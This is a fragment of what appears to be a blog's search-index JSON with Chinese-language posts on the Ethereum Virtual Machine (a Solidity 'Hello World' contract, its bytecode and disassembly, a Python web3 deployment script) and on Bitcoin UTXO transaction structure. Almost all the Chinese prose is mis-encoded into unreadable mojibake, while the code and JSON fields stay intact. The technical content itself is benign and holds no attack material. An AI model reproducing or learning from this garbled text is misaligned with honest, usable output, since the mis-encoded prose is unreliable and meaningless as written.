è¿™æ˜¯ä¸€ä¸ªä¸å¯å˜çš„å­—æ®µï¼ŒåŒ…å«ä¸è´¦æˆ·ç›¸å…³çš„æ™ºèƒ½åˆçº¦ä»£ç çš„å“ˆå¸Œå€¼ã€‚ åœ¨æ™®é€šè´¦æˆ·çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªå­—æ®µåŒ…å«ç©ºå­—ç¬¦ä¸²çš„Keccak 256ä½å“ˆå¸Œå€¼ å¹³æ—¶åŒºåˆ†ä¸€ä¸ªæ“ä½œæ˜¯å¦ä¼šæ”¹å˜åŒºå—é“¾çš„çŠ¶æ€, å¯ä»¥ç®€å•åœ°çœ‹æ”¹æ“ä½œæ˜¯å¦èŠ±è´¹gas, å¦‚æœä¸èŠ±è´¹gasåˆ™å…¶ä¸ä¼šæ”¹å˜. å¯¹åº”åˆ°ä»£ç å±‚é¢åˆ™å‚è€ƒ: https://yinhui1984.github.io/å¯¹æ™ºèƒ½åˆçº¦çš„è¯»æ–¹æ³•å’Œå†™æ–¹æ³•çš„è°ƒç”¨/ ","date":"2022-10-06","objectID":"/evm/:2:2","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"ä¸–ç•Œè®¡ç®—æœº ETHæœ€å¤§çš„åˆ›æ–°ç‚¹æ˜¯æ™ºèƒ½åˆçº¦. ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ç¼–å†™ç¨‹åºä»£ç æ¥äº¤ç»™æ¯ä¸ªé‡‡çŸ¿èŠ‚ç‚¹ä¸Šçš„EVMè¿›è¡Œæ‰§è¡Œ. ç¼–å†™ä»£ç æ‰€ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€å¯ä»¥æ˜¯ Solidity LLLL ç­‰, å‚è€ƒ: https://github.com/pirapira/awesome-ethereum-virtual-machine#programming-languages-that-compile-into-evm ä½†ä¸€èˆ¬æŒ‡çš„éƒ½æ˜¯ Solidity, EVMå¹¶ä¸èƒ½ç›´æ¥æ‰§è¡ŒSolidityï¼Œé¦–å…ˆå¿…é¡»å°†ä»£ç ç¼–è¯‘æˆè¾ƒä½çº§åˆ«çš„æœºå™¨æŒ‡ä»¤ï¼Œç§°ä¸ºæ“ä½œç (Opcodes) Solidity ä¸ Opcodes EVMè¢«å¹¿æ³›åœ°æ ‡è®°ä¸ºå›¾çµå®Œå¤‡æˆ–æ›´å‡†ç¡®åœ°è¯´æ˜¯å‡†å›¾çµå®Œå¤‡ã€‚è¿™æ„å‘³ç€ï¼ŒEVMåœ¨ç†è®ºä¸Šå¯ä»¥è§£å†³ä»»ä½•è®¡ç®—é—®é¢˜ã€‚è¿™æ˜¯é€šè¿‡æ‰§è¡Œç§°ä¸ºEVMæ“ä½œç çš„æœºå™¨çº§æŒ‡ä»¤æ¥å®ç°çš„ã€‚ EVMæ“ä½œç ååŠ©EVMå®Œæˆæ™ºèƒ½åˆçº¦æˆ–äº¤æ˜“çš„å…·ä½“ä»»åŠ¡ã€‚ç›®å‰ï¼ŒEVMå¤§çº¦æœ‰150ä¸ªæ“ä½œç å¯ä»¥æ‰§è¡Œã€‚å®ƒä»¬æ¶µç›–äº†ä¸€ç³»åˆ—çš„æ“ä½œï¼ŒåŒ…æ‹¬ï¼šç®—æœ¯ã€åœæ­¢ã€è®°å½•ã€å¤åˆ¶ã€æ¨é€ã€å†…å­˜ã€æ¯”è¾ƒå’Œäº¤æ¢ã€‚ä»¥åŠç”¨äºæ£€ç´¢å—å’Œç¯å¢ƒä¿¡æ¯ã€‚ä½ å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ“ä½œä»£ç çš„åˆ—è¡¨è¿™é‡Œã€‚ ä¸¾ä¸€ä¸ªHelloWorldçš„ä¾‹å­ // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Ex001HelloWorld { string public greet = \"Hello World!\"; } ä½¿ç”¨solcè¿›è¡Œç¼–è¯‘: solc --bin --abi --optimize --overwrite -o ./output ./hello.sol æˆ‘ä»¬å¾—åˆ°çš„*.abiå’Œ*.binæ–‡ä»¶, å…¶ä¸­ binåªæ˜¯ç¼–è¯‘åçš„å­—èŠ‚ç çš„ç´§å‡‘äºŒè¿›åˆ¶è¡¨ç¤ºã€‚æ“ä½œç ä¸æ˜¯ç”±PUSHã€PULLæˆ–DELEGATECALLå¼•ç”¨çš„ï¼Œè€Œæ˜¯å®ƒä»¬çš„äºŒè¿›åˆ¶è¡¨ç¤ºï¼Œç”¨æ–‡æœ¬ç¼–è¾‘å™¨è¯»å–æ—¶çœ‹èµ·æ¥åƒéšæœºæ•°å­—ã€‚ cat Ex001HelloWorld.bin 60c0604052600c60809081526b48656c6c6f20576f726c642160a01b60a05260009061002b90826100dd565b5034801561003857600080fd5b5061019c565b634e487b7160e01b600052604160045260246000fd5b600181811c9082168061006857607f821691505b60208210810361008857634e487b7160e01b600052602260045260246000fd5b50919050565b601f8211156100d857600081815260208120601f850160051c810160208610156100b55750805b601f850160051c820191505b818110156100d4578281556001016100c1565b5050505b505050565b81516001600160401b038111156100f6576100f661003e565b61010a816101048454610054565b8461008e565b602080601f83116001811461013f57600084156101275750858301515b600019600386901b1c1916600185901b1785556100d4565b600085815260208120601f198616915b8281101561016e5788860151825594840194600190910190840161014f565b508582101561018c5787850151600019600388901b60f8161c191681555b5050505050600190811b01905550565b61019a806101ab6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cfae321714610030575b600080fd5b61003861004e565b60405161004591906100dc565b60405180910390f35b6000805461005b9061012a565b80601f01602080910402602001604051908101604052809291908181526020018280546100879061012a565b80156100d45780601f106100a9576101008083540402835291602001916100d4565b820191906000526020600020905b8154815290600101906020018083116100b757829003601f168201915b505050505081565b600060208083528351808285015260005b81811015610109578581018301518582016040015282016100ed565b506000604082860101526040601f19601f8301168501019250505092915050565b600181811c9082168061013e57607f821691505b60208210810361015e57634e487b7160e01b600052602260045260246000fd5b5091905056fea26469706673582212208a0be23ced512b2079cbbc853392d671d17da38eaa87497f70ad2b7ef259ae1b64736f6c63430008110033 å¦‚æœæˆ‘ä»¬ä½¿ç”¨evmæ¥åæ±‡ç¼–, å°±å¯ä»¥çœ‹åˆ° evm disasm Ex001HelloWorld.bin evm disasm Ex001HelloWorld.bin ... 00000: PUSH1 0xc0 00002: PUSH1 0x40 00004: MSTORE 00005: PUSH1 0x0c 00007: PUSH1 0x80 00009: SWAP1 0000a: DUP2 0000b: MSTORE 0000c: PUSH12 0x48656c6c6f20576f726c6421 00019: PUSH1 0xa0 0001b: SHL 0001c: PUSH1 0xa0 0001e: MSTORE 0001f: PUSH1 0x00 00021: SWAP1 00022: PUSH2 0x002b 00025: SWAP1 ... å…¶ä¸­çš„0x48656c6c6f20576f726c6421 å°±æ˜¯ Hello World!å­—ç¬¦ä¸² éƒ¨ç½²åˆçº¦: #!/usr/bin/env python3 from web3 import Web3 # pip3 install web3 import solcx # pip3 install py-solc-x w3 = Web3(Web3.IPCProvider('../mychain/data/geth.ipc')) print('Connected to Ethereum client: %s' % w3.clientVersion) src = '../contracts/Ex001HelloWorld.sol' contract_src = open(src).read() print(contract_src) compiled_sol = solcx.compile_source(contract_src, output_values=['bin', 'abi']) contract_interface = compiled_sol['\u003cstdin\u003e:Ex001HelloWorld'] Ex001HelloWorld = w3.eth.contract(abi=contract_interface['abi'], bytecode=contract_interface['bin']) w3.eth.default_account = w3.eth.accounts[0] tx_hash = Ex001HelloWorld.constructor().transact() tx_receipt = w3.eth.waitForTransactionReceipt(tx_hash) print(\"tx_receipt:\\n %s\" % tx_receipt) print(\"-----------------------------------------------------\") print(\"åˆçº¦åœ°å€:\" + tx_receipt.contractAddress) # write the contract address to a file with open(\"../contracts/Ex001HelloWorld.address\", \"w\") as f: f.write(tx_receipt.contractAddress) f.close() è°ƒç”¨åˆçº¦ import Web3 from \"web3\"; import net from \"net\"; import * as","date":"2022-10-06","objectID":"/evm/:2:3","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"EVMçš„ç‰¹ç‚¹ ","date":"2022-10-06","objectID":"/evm/:3:0","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"ç¡®å®šçš„ å¦‚æœä¸€ä¸ªç¨‹åºå¯¹åŒä¸€ç»„è¾“å…¥ç»™å‡ºç›¸åŒçš„è¾“å‡ºï¼Œæ— è®ºæ‰§è¡Œå¤šå°‘æ¬¡ä»£ç ï¼Œå®ƒéƒ½æ˜¯ç¡®å®šæ€§çš„ã€‚ç¡®å®šæ€§å‡½æ•°çš„ä¸€ä¸ªå®Œç¾ä¾‹å­æ˜¯ç»å…¸çš„æ•°å­¦è¿ç®—ã€‚ä¾‹å¦‚ï¼Œå‡è®¾æ‰€æœ‰çš„æ•°å­—éƒ½æ˜¯ä»¥10ä¸ºåŸºæ•°ï¼Œæ— è®ºä½ é‡å¤å¤šå°‘æ¬¡è¿™ä¸ªæ“ä½œ, 1+4æ€»æ˜¯5ã€‚ ä¸€ä¸ªç›¸åçš„ä¾‹å­çš„æµ®ç‚¹æ•°, ç”¨Cæˆ–è€…C++éšæ„å†™å…³äºæµ®ç‚¹æ•°è®¡ç®—çš„ä»£ç å¹¶ä¸”æœŸæœ›å®ƒä»¬èƒ½å¤Ÿåœ¨ä¸åŒçš„ç¼–è¯‘å™¨æˆ–è€…ä¸åŒæ¶æ„çš„æœºå™¨ä¸Šå¾—åˆ°å®Œå…¨ä¸€è‡´çš„ç»“æœæ˜¯éå¸¸éå¸¸å¤©çœŸçš„ã€‚ EVMä¸Šçš„Solidityä¹Ÿç”¨åŒæ ·çš„é—®é¢˜, æ‰€ä»¥å…¶å¹²è„†æ˜¯ä¸æ”¯æŒæµ®ç‚¹æ•°çš„. ","date":"2022-10-06","objectID":"/evm/:3:1","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"å¯ç»ˆæ­¢çš„ ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦æ˜¯å›¾çµå®Œå¤‡çš„ã€‚å¦‚æœæœ‰è¶³å¤Ÿçš„æ—¶é—´å’Œèµ„æºï¼Œæ™ºèƒ½åˆçº¦åº”è¯¥èƒ½å¤Ÿè§£å†³ä»»ä½•é—®é¢˜ã€‚ç„¶è€Œï¼Œæ— æ³•åˆ¤æ–­ä¸€ä¸ªåˆçº¦æ˜¯å¦èƒ½åœ¨ç»™å®šçš„æ—¶é—´é™åˆ¶å†…å®Œæˆæ‰€æœ‰æ“ä½œã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ™ºèƒ½åˆçº¦åº”è¯¥æœ‰ä¸€ä¸ªç»ˆæ­¢æœºåˆ¶ã€‚ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä½¿ç”¨ â€œgas â€œæ¥å®šä¹‰\"å¯¿å‘½â€ã€‚å½“ä¸€ä¸ªæ‰§è¡Œåˆçº¦çš„gasé™åˆ¶è¿‡åï¼Œå®ƒå°±ä¼šåœæ­¢æ‰€æœ‰æ“ä½œã€‚ å…³äºå›¾çµå®Œå¤‡, æœ‰äº›åœ°æ–¹ä¹Ÿè¯´çš„æ˜¯å…¶ä¸º\"å‡†å›¾çµå®Œå¤‡â€, å› ä¸ºä¸å¯èƒ½æ— gasé™åˆ¶åœ°è¿è¡Œä¸€ä¸ªæ™ºèƒ½åˆçº¦. ","date":"2022-10-06","objectID":"/evm/:3:2","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"å­¤ç«‹çš„ EVMè¿è¡Œæ™ºèƒ½åˆçº¦æ—¶, æ™ºèƒ½åˆçº¦åº”è¯¥åœ¨ä¸€ä¸ªå®Œå…¨éš”ç¦»çš„ç¯å¢ƒä¸­è¿è¡Œã€‚å¦‚æœæ”¹æ™ºèƒ½åˆçº¦å‘ç”Ÿäº†ä¸€äº›é”™è¯¯ï¼Œå®ƒä¸åº”è¯¥å½±å“åº•å±‚åè®®çš„å…¶ä»–éƒ¨åˆ†. ","date":"2022-10-06","objectID":"/evm/:3:3","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"EVMçš„ä¸»è¦é—®é¢˜ EVMæ˜¯åŒºå—é“¾è¡Œä¸šçš„ä¸€é¡¹çªç ´æ€§åˆ›æ–°ï¼Œå› ä¸ºå®ƒä½¿æˆ‘ä»¬æ‰€çŸ¥çš„dAppsæˆä¸ºå¯èƒ½ã€‚åŒæ—¶ï¼Œä¸€äº›ä¸“å®¶æ³¨æ„åˆ°å®ƒçš„è®¾è®¡ç¼ºé™·ã€‚ å­—èŠ‚ç ä¸æ˜¯äººç±»å¯ä»¥é˜…è¯»çš„ã€‚è¿™ä½¿å¾—å¼€å‘äººå‘˜å’Œç‹¬ç«‹è§‚å¯Ÿå‘˜å¾ˆéš¾åˆ†æå’ŒéªŒè¯æ™ºèƒ½åˆçº¦ä»£ç ã€‚ éš¾ä»¥è°ƒè¯•ã€‚è¿™æ˜¯ä¸Šä¸€ç‚¹çš„ç›´æ¥åæœï¼šä½ å¿…é¡»å°†å­—èŠ‚ç åç¼–è¯‘æˆäººç±»å¯è¯»çš„å½¢å¼ï¼Œä»¥äº†è§£dAppå‡ºäº†ä»€ä¹ˆé—®é¢˜ã€‚ å®ƒçš„é€Ÿåº¦å¾ˆæ…¢ï¼Œè€Œä¸”è¦æ”¶å–å¤§é‡çš„gasã€‚æ³¨æ„ï¼ŒEVMçš„é€Ÿåº¦æ˜¯æŒ‡æ¯ç§’å¤„ç†çš„æ“ä½œç æ•°é‡ï¼Œæ‰€ä»¥å®ƒä¸ä»¥å¤ªåŠåŒºå—é“¾å¤„ç†äº¤æ˜“çš„èƒ½åŠ›ä¸ä¸€æ ·â€“ä»¥å¤ªåŠåŒºå—é“¾çš„é€Ÿåº¦ä¹Ÿå¾ˆæ…¢ï¼Œæ¯ç§’15ç¬”äº¤æ˜“ã€‚ å®ƒä¸å¤Ÿå®‰å…¨ã€‚EVMåº”è¯¥ä¿æŠ¤åŒºå—é“¾å’ŒdAppså…å— â€œå â€œä»£ç çš„å½±å“ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬ä¸æ–­çœ‹åˆ°æ–°çš„æ™ºèƒ½åˆçº¦æ¼æ´ã€‚ç‰¹åˆ«å±é™©çš„æ˜¯é‡å…¥å¼æ”»å‡»ï¼Œå½“é»‘å®¢é‡å¤è°ƒç”¨ææ¬¾å‡½æ•°ä»¥è€—å°½åˆçº¦çš„èµ„é‡‘æ—¶ã€‚ åˆçº¦æ˜¯ä¸å¯å‡çº§çš„ã€‚ä¸€æ—¦ä½ å‘ç°ä»€ä¹ˆåœ°æ–¹å‡ºäº†é—®é¢˜ï¼Œä½ å°±æ— æ³•ä¿®å¤å®ƒï¼Œå› ä¸ºä»¥å¤ªåŠæ™ºèƒ½åˆçº¦åœ¨éƒ¨ç½²åä¸èƒ½è¢«æ”¹å˜ã€‚ä½ å¿…é¡»ä»å¤´å¼€å§‹ï¼Œéƒ¨ç½²ä¸€ä¸ªæ–°çš„åˆçº¦ï¼Œè¿ç§»ç”¨æˆ·ç­‰ç­‰ã€‚ EVMä¸æ”¯æŒæœ¬åœ°åº“ã€‚åº“æ˜¯ä¸€ç»„ä¸è™šæ‹Ÿæœºä¸€èµ·åˆ†å‘çš„æ ‡å‡†åˆçº¦ã€‚å¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨åº“ä¸­çš„ç°æˆé¡¹ç›®ï¼Œè€Œä¸æ˜¯ä»å¤´å¼€å§‹ç¼–å†™æ‰€æœ‰çš„ä»£ç ï¼Œä»è€ŒèŠ‚çœå¤§é‡çš„æ—¶é—´ã€‚å¯¹äºæ™ºèƒ½åˆçº¦ï¼Œä½¿ç”¨åº“ä¹Ÿå¯ä»¥èŠ‚çœgasâ€“ä¹Ÿå°±æ˜¯èŠ‚çœé‡‘é’±ã€‚ä½†ç”±äºEVMé»˜è®¤ä¸åŒ…æ‹¬ä»»ä½•æ ‡å‡†åº“ï¼ˆä¾‹å¦‚ï¼Œä¸åƒMove VMï¼‰ï¼Œç¼–å†™å’Œéƒ¨ç½²æ™ºèƒ½åˆçº¦å˜å¾—éå¸¸æ˜‚è´µã€‚ ","date":"2022-10-06","objectID":"/evm/:4:0","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"è¶‹åŠ¿ WebAssembly ä½¿ç”¨WebAssembly(ETHçš„WebAssemblyå«eWASM)ä»£æ›¿EVM ","date":"2022-10-06","objectID":"/evm/:5:0","tags":["EVM","L0","Web3.0"],"title":"EVM","uri":"/evm/"},{"categories":["Blockchain"],"content":"ä¸€äº›å…³äºUTXOçš„ç†è§£ åœ¨web3çš„çš„L0ä¸­, æ¶‰åŠåˆ°ä¸€ä¸ªæ¦‚å¿µ Platform neutral language (æœ‰äº›åœ°æ–¹ä¹Ÿå†™åš Platform-neutral computation description language ) å¹³å°ä¸­ç«‹çš„è®¡ç®—æè¿°è¯­è¨€, æŒ‡ä¸€ç§åœ¨ä¸åŒç‰©ç†å¹³å°ï¼ˆæ¶æ„ã€æ“ä½œç³»ç»Ÿç­‰ï¼‰ä¸Šæ‰§è¡Œç›¸åŒç¨‹åºçš„æ–¹æ³•ã€‚æ³¨æ„, å®ƒæ˜¯ä¸€ç§æè¿°, ä¸€ç§æ–¹å¼, è€Œä¸æ˜¯å…·ä½“çš„ç¼–ç¨‹è¯­è¨€. ç¤ºä¾‹åŒ…æ‹¬ EVMï¼ˆä»¥å¤ªåŠï¼‰ã€UTXOï¼ˆæ¯”ç‰¹å¸ï¼‰å’Œ Wasmï¼ˆPolkadotï¼‰ã€‚ è¿™é‡Œå…ˆçœ‹çœ‹ UTXO : An unspent transaction output æœªèŠ±è´¹çš„äº¤æ˜“è¾“å‡º ","date":"2022-08-31","objectID":"/utxo/:0:0","tags":["UTXO","L0","Web3.0"],"title":"UTXO","uri":"/utxo/"},{"categories":["Blockchain"],"content":"ä»€ä¹ˆUTXO ä¸€ä¸ªäº¤æ˜“(TX)ç”±ä¸€ä¸ªæˆ–å¤šä¸ªè¾“å…¥(Input)å’Œä¸€ä¸ªæˆ–å¤šä¸ªè¾“å‡º(Output)ç»„æˆ. ä¸€ä¸ªè¾“å‡ºç”±ä¸¤ä¸ªçŠ¶æ€: æœªè¢«ä½¿ç”¨ å’Œ å·²è¢«ä½¿ç”¨, è¿™ä¸ªä½¿ç”¨çš„æ„æ€æ˜¯: è¯¥è¾“å‡ºä½œä¸ºå¦å¤–ä¸€æ¬¡äº¤æ˜“çš„è¾“å…¥è€Œè¢«èŠ±æ‰(æˆ–èŠ±æ‰ä¸€éƒ¨åˆ†) ä½ çš„è´¦æˆ·ä¸Šæ‰€æœ‰æœªè¢«ä½¿ç”¨æ‰çš„è¾“å…¥(unspent transaction output ,UTXO)çš„æ€»å’Œå°±æ˜¯æˆ‘ä»¬å¹³æ—¶æ‰€è¯´çš„è´¦æˆ·ä½™é¢. ä½†åœ¨BTCçš„åŒºå—é“¾è´¦æœ¬ä¸­,æˆ‘ä»¬å¹¶ä¸åƒå¹³æ—¶ä¸€æ ·ä½¿ç”¨ä½™é¢(balance)æ¥è¿›è¡Œè®°å½•, è€Œæ˜¯ä½¿ç”¨è‹¥å¹²ä¸ªæœªè¢«ä½¿ç”¨æ‰çš„è¾“å…¥,ä¹Ÿå°±æ˜¯UTXOs å‡è®¾æˆ‘ä»¬ç°åœ¨çš„è´¦æˆ·ä¸Šè¿˜æœ‰ä¸¤ä¸ªUTXO, ä¸€ä¸ª0.2BTC, å¦å¤–ä¸€ä¸ª0.4BTC, è¦è¿›è¡ŒæŸæ¬¡äº¤æ˜“, æƒ…å†µä¸¾ä¾‹1: äº¤æ˜“éœ€è¦èŠ±æ‰0.1BTC, è¿™ä¸ªæ—¶å€™å‘ç°0.2BTCè¿™ä¸ªUTXOå°±å¤ŸèŠ±äº†, æ‰€ä»¥äº¤æ˜“ä¼šä½¿ç”¨0.2BTCä½œä¸ºinput, å½“è¿™ä¸ªäº¤æ˜“å®Œæˆæ—¶,è¿™ä¸ª0.2BTCå°±ä¸å†è¯•UTXO, å…¶ä¼šè¢«åˆ†è§£æˆ2ä¸ª0.1BTCçš„UTXO (æˆ‘ä»¬è¿™é‡Œå…ˆå¿½ç•¥æ—·å·¥è´¹), å…¶ä¸­ä¸€ä¸ª0.1BTCçš„UTXOå‘é€åˆ°äº†å¯¹æ–¹è´¦æˆ·, å¦å¤–ä¸€ä¸ª0.1BTCè¿”è¿˜ç»™æˆ‘ä»¬è‡ªå·±. è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è´¦æˆ·ä¸Šè¿˜å­˜åœ¨2ä¸ªUXTO, ä¸€ä¸ª0.1BTC, ä¸€ä¸ª0.4BTC æƒ…å†µä¸¾ä¾‹2: äº¤æ˜“éœ€è¦èŠ±æ‰0.5BTC, è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¿”å›0.2å’Œ0.4è¿™ä¸¤ä¸ªUTXOéƒ½ä¸è¶³ä»¥å®Œæˆè¯¥æ¬¡äº¤æ˜“, ä½†0.2+0.4æ˜¯è¶³å¤Ÿçš„, æ‰€ä»¥éœ€è¦å°†ä»–ä»¬åŒæ—¶ä½œä¸ºè¯¥æ¬¡äº¤æ˜“çš„input,å¹¶ç”Ÿæˆ2ä¸ªUTXO, ä¸€ä¸ª0.5BTCåˆ°å¯¹æ–¹è´¦æˆ·, å¦å¤–ä¸€ä¸ª0.1BTCè¿”è¿˜åˆ°è‡ªå·±è´¦æˆ·. ","date":"2022-08-31","objectID":"/utxo/:1:0","tags":["UTXO","L0","Web3.0"],"title":"UTXO","uri":"/utxo/"},{"categories":["Blockchain"],"content":"TXæ„æˆ ä¸€ä¸ªäº¤æ˜“(TX)ç”±å¦‚ä¸‹è¿™äº›å­—æ®µç»„æˆ TXçš„å­—æ®µ å¤§å° (å­—èŠ‚) æè¿° version 4 å®ƒæ˜¯æŒ‡å®šç½‘ç»œäº¤æ˜“ç±»å‹çš„ç‰ˆæœ¬å·ã€‚é€šè¿‡ï¼ŒèŠ‚ç‚¹å¯ä»¥ç¡®å®šç”¨äºéªŒè¯è¯¥ç‰¹å®šäº¤æ˜“çš„è§„åˆ™é›† input counter 1-9 input æ•°é‡, æŒ‡ä¸‹é¢çš„input list çš„é•¿åº¦ inputs list ä¸å›ºå®š è¾“å…¥åˆ—è¡¨ output counter 1-9 output æ•°é‡, æŒ‡ä¸‹é¢çš„output list çš„é•¿åº¦ outputs list ä¸å›ºå®š è¾“å‡ºåˆ—è¡¨ lock time 4 å®ƒæŒ‡å®šäº¤æ˜“æ˜¯å¦å¯ä»¥ç«‹å³æˆ–åœ¨æŒ‡å®šæ—¶é—´ååŒ…å«åœ¨åŒºå—é“¾ä¸­ å…¶ä¸­Inputç”±ä¸‹é¢è¿™äº›å­—æ®µç»„æˆ Inputçš„å­—æ®µ å¤§å° (å­—èŠ‚) æè¿° previous tx hash 32 ä¸Šä¸€æ¬¡äº¤æ˜“çš„hash (è¿½æº¯è¿™ä¸ªinputæ˜¯ä»å“ªé‡Œæ¥çš„) previous out index 4 ä¸Šä¸€æ¬¡äº¤æ˜“æ˜¯å…¶åœ¨outputsä¸­çš„indexå· Script length 1-9 è§£é”è„šæœ¬çš„å¤§å° Unlocking script å¯å˜ è§£é”è„šæœ¬æ˜¯ç”¨äºè¯æ˜å…è®¸äº¤æ˜“èŠ±è´¹ç»™å®š UTXO çš„è„šæœ¬ã€‚è¿™æ˜¯é€šè¿‡é¦–å…ˆæ‰§è¡Œè§£é”è„šæœ¬ï¼Œç„¶åä¸ºäº¤æ˜“è¾“å…¥å¼•ç”¨çš„ UTXO æ‰§è¡Œé”å®šè„šæœ¬æ¥å®Œæˆçš„ Sequence number 4 é€šå¸¸æ˜¯ç¦ç”¨æˆ–åŒ…å«é”å®šæ—¶é—´ - ç¦ç”¨è¡¨ç¤ºä¸º0xFFFFFFFF å…¶ä¸­ Outputç”±ä¸‹é¢è¿™äº›å­—æ®µç»„æˆ Outputçš„å­—æ®µ å¤§å° æè¿° Value 8 å°†è¦è½¬ç§»çš„Satoshisæ€»æ•°ï¼ˆæ­£æ•´æ•°ï¼‰ Script size 1 â€“ 9 é”å®šè„šæœ¬å¤§å° Locking script å¯å˜ é”å®šè„šæœ¬ é”å®šå’Œè§£é”è„šæœ¬å‚è€ƒ è¿™é‡Œ https://medium.com/@ackhor/ch-10-something-on-transaction-unlocking-locking-script-83228754c3f9 æ¯”ç‰¹å¸äº¤æ˜“é€šè¿‡ç”¨å½“å‰æ‰€æœ‰è€…çš„ç­¾åï¼ˆæˆ–ä¸å…¬é’¥/è„šæœ¬ä¸€èµ·ï¼‰è§£é”ç°æœ‰çš„UTXOï¼ˆåœ¨è¾“å…¥ç«¯ï¼‰ï¼Œå¹¶é€šè¿‡é”å®šæ–°æ‰€æœ‰è€…çš„å…¬é’¥/å…¬é’¥å“ˆå¸Œ/è„šæœ¬å“ˆå¸Œç”Ÿæˆæ–°çš„UTXOï¼ˆåœ¨è¾“å‡ºç«¯ï¼‰ã€‚ â€œè§£é” â€œå’Œ â€œé”å®š â€œå®é™…ä¸Šæ˜¯ç”±ç§°ä¸º â€œè„šæœ¬ â€œçš„ç¼–ç¨‹è¯­è¨€æ¥å®Œæˆçš„ã€‚è„šæœ¬æ˜¯ä¸€ä¸ªåŸºäºå †æ ˆçš„ç¨‹åºï¼Œç”±æ•°æ®å’Œæ“ä½œä»£ç ï¼ˆæ“ä½œä»£ç ï¼‰ç»„æˆã€‚æ•°æ®æ˜¯ç”¨æ¥ â€œæ¨ â€œå…¥å †æ ˆå’Œ â€œå¼¹ â€œå‡ºå †æ ˆçš„ã€‚è¯·ä¸è¦å°†è¿™äº›æ•°æ®ä¸æ¯”ç‰¹å¸äº¤æ˜“æ•°æ®æ··æ·†ã€‚è„šæœ¬ä¸­çš„è¿™äº›æ•°æ®åŸºæœ¬ä¸Šæ˜¯å…¬é’¥ã€å…¬é’¥å“ˆå¸Œã€è„šæœ¬å“ˆå¸Œå’Œç­¾åã€‚å¦ä¸€æ–¹é¢ï¼Œæ“ä½œç ä»å †æ ˆä¸­â€™å¼¹å‡ºâ€™æ•°æ®ï¼Œå¯¹æ•°æ®åšä¸€äº›å¤„ç†ï¼Œç„¶åå°†ç»“æœâ€™æ¨â€™å›å †æ ˆä¸­ã€‚å¦‚æœç»“æœæ˜¯'1â€™ï¼Œé‚£ä¹ˆè¿™ä¸ªè„šæœ¬å°±æ˜¯æœ‰æ•ˆçš„ ","date":"2022-08-31","objectID":"/utxo/:2:0","tags":["UTXO","L0","Web3.0"],"title":"UTXO","uri":"/utxo/"},{"categories":["Blockchain"],"content":"çœ‹æ‡‚ä¸€æ¬¡äº¤æ˜“ ä»¥è¿™ä¸ªäº¤æ˜“ä¸ºä¾‹: https://www.blockchain.com/btc/tx/d28ca5a59b2239864eac1c96d3fd1c23b747f0ded8f5af0161bae8a616b56a1d å¯ä»¥çœ‹åˆ°è¿™ä¸ªäº¤æ˜“ç”±ä¸€ä¸ªinputåŠ ä¸Š2ä¸ªoutputç»„æˆ. input: 0.00137322btc output[0]: 0.00033324btc output[1]: 0.00093376btc çŸ¿å·¥è´¹: 0.00010622 btc 0.00033324 + 0.00093376 + 0.00010622 = 0.00137322 ","date":"2022-08-31","objectID":"/utxo/:3:0","tags":["UTXO","L0","Web3.0"],"title":"UTXO","uri":"/utxo/"},{"categories":["Blockchain"],"content":"UTXOsé›† BTCåŒºå—é“¾ä¸­å­˜åœ¨çš„å…¨éƒ¨UTXOè¡¨ç¤ºä¸ºä¸€ä¸ªé›†åˆï¼Œå¹¶ç”±æ¯ä¸ªæ¯”ç‰¹å¸èŠ‚ç‚¹ä¸æ–­ç»´æŠ¤ã€‚ æ¯ç¬”äº¤æ˜“éƒ½ä¼šæ¶ˆè€—è¿™ä¸ªé›†åˆä¸­çš„å…ƒç´ ï¼Œå¹¶åˆ›å»ºæ–°çš„å…ƒç´ ï¼Œç„¶åæ·»åŠ åˆ°è¿™ä¸ªé›†åˆä¸­ã€‚ å› æ­¤ï¼Œè¿™ä¸ªé›†åˆä»£è¡¨äº†ä¸€ä¸ªç‰¹å®šåŠ å¯†è´§å¸ç³»ç»Ÿä¸­çš„æ‰€æœ‰ä»£å¸ã€‚ æ¯å½“åŒºå—é“¾ä¸­æ¥å—ä¸€ä¸ªæ–°åŒºå—æ—¶ï¼ŒUTXOé›†å°±ä¼šæ›´æ–°ã€‚ ç½‘ç»œä¸­çš„æ¯ä¸ªæ¯”ç‰¹å¸èŠ‚ç‚¹åœ¨å…¶æœ¬åœ°å­˜å‚¨ä¸­éƒ½ä¼šæœ‰UTXOé›†çš„ç²¾ç¡®å‰¯æœ¬ã€‚ å®Œæ•´çš„UTXOé›†å¯ä»¥è¢«åŠ æ€»ï¼Œä»¥è®¡ç®—å‡ºæŸä¸€ç‰¹å®šæ—¶é—´ç‚¹çš„åŠ å¯†è´§å¸çš„æ€»ä¾›åº”é‡ã€‚ åœ¨åŒºå—é“¾äº¤æ˜“æœ‰æ•ˆçš„æƒ…å†µä¸‹ï¼Œåªæœ‰æœªèŠ±è´¹çš„è¾“å‡ºå¯ä»¥ç”¨äºèµ„åŠ©è¿›ä¸€æ­¥çš„äº¤æ˜“ã€‚ 